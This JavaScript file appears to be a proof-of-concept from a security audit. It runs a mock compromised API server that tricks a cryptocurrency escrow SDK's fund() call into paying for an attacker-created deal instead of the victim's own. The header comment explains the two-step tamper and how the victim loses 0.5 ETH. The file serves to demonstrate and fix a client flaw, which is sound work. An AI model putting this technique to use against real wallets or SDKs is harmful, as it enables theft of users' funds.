// Mock Bull API server for round 6 K-119 — plays the role of a COMPROMISED /
// MALICIOUS Bull API against the NEW SDK (src-live-2026-11-17, escrow v3).
//
// THE TAMPER (two moves, both by the server):
//  1. During the victim's open() for legit deal A, the server returns a
//     createDeal for the ATTACKER's deal B instead (seller=attacker, sell
//     1 token for 0.5 ETH, buyerReceive=attacker). The NEW open() CATCHES
//     this — it throws "does not match" — but the transaction was ALREADY
//     SENT: deal B now exists on-chain with buyer=victim. The victim
//     retries, opens A correctly, and believes the tamper is behind them.
//  2. During the victim's fund(A), the server returns the funding step for
//     deal B instead: fundPayment(B) with value 0.5 ETH. The NEW fund()
//     reads deal A from the chain (buyer=victim, payAmount 0.5 ETH) and
//     caps the step's value at payAmount(A) — 0.5 ETH passes — but NEVER
//     checks that the step belongs to deal A. fundPayment(B) requires
//     msg.value == payAmount(B) == 0.5 ETH: exact match, succeeds.
// The attacker then funds 1 token into B; B settles: 1 token and 0.5 ETH
// (minus fee) both go to the attacker. The victim paid 0.5 ETH, got 0
// tokens, and deal A is left open and unfunded.
//
// Why deal B can exist at all (v3 consent gate): the ATTACKER is the
// seller of B and signs the EIP-712 Consent for B's own (bad) terms
// themselves — the consent gate binds the SELLER, and the attacker IS
// that seller. The buyer of B is the victim, and createDeal takes the
// buyer from msg.sender — but the victim's OWN open() call sent the
// tampered createDeal(B) transaction (move 1). No victim consent is
// needed for the buyer role, and none exists: the victim never agreed
// to buy 1 token for 0.5 ETH.
// The claim proven here is the CLIENT's missing step binding in fund(),
// not the escrow: MockEscrowV3 is the v2 source verbatim + the v3
// consent gate (see chain/src/MockEscrowV3.sol).
import http from "node:http";
import { encodeFunctionData, parseAbi, parseEther } from "viem";

const ZERO = "0x0000000000000000000000000000000000000000";
const ESCROW_ABI = parseAbi([
  "function createDeal((address seller,address sellerPayout,address buyerReceive,address sellToken,uint256 sellAmount,address payToken,uint256 payAmount,uint64 deadline) p, bytes sellerSig, (uint16 feeBps,uint64 expiry,bytes sig) q, uint64 validUntil) returns (uint256 id)",
  "function fundPayment(uint256 id) payable",
]);

export function startMockApi({ port, escrow, feeSignerKey, dealA, dealB, attackerDealId, victim }) {
  let quoteCalls = 0;
  const server = http.createServer((req, res) => {
    const send = (obj) => {
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify(obj));
    };
    if (req.method === "POST" && req.url === "/api/v1/settle") {
      let body = "";
      req.on("data", (c) => (body += c));
      req.on("end", async () => {
        const b = JSON.parse(body || "{}");
        if (b.consentOnly) {
          res.writeHead(400, { "content-type": "application/json" });
          res.end(JSON.stringify({ error: "consentOnly not served by this mock" }));
          return;
        }
        quoteCalls += 1;
        // Move 1: the FIRST open() gets the attacker's deal B; retries get A.
        const deal = quoteCalls === 1 ? dealB : dealA;
        const label = quoteCalls === 1 ? "B (ATTACKER)" : "A (legit)";
        const data = encodeFunctionData({
          abi: ESCROW_ABI, functionName: "createDeal",
          args: [deal.params, deal.sellerSig, deal.quote, deal.validUntil],
        });
        console.log(`[mock-api] POST /api/v1/settle #${quoteCalls} — returning createDeal for deal ${label}`);
        send({ transaction: { to: escrow, data, value: "0" } });
      });
      return;
    }
    if (req.method === "GET" && req.url.startsWith("/api/v1/settle/")) {
      // Move 2: fund(A) gets the funding step for deal B.
      const data = encodeFunctionData({
        abi: ESCROW_ABI, functionName: "fundPayment", args: [BigInt(attackerDealId)],
      });
      console.log("[mock-api] GET /api/v1/settle/" + req.url.split("/").pop() + " — MALICIOUS: returning fundPayment(deal B) instead of fundPayment(deal A)");
      send({
        buyerSteps: [{ from: victim, transaction: { to: escrow, data, value: parseEther("0.5").toString() } }],
        sellerSteps: [],
      });
      return;
    }
    res.writeHead(404, { "content-type": "application/json" });
    res.end(JSON.stringify({ error: "not found" }));
  });
  return new Promise((resolve) => server.listen(port, "127.0.0.1", () => resolve(server)));
}
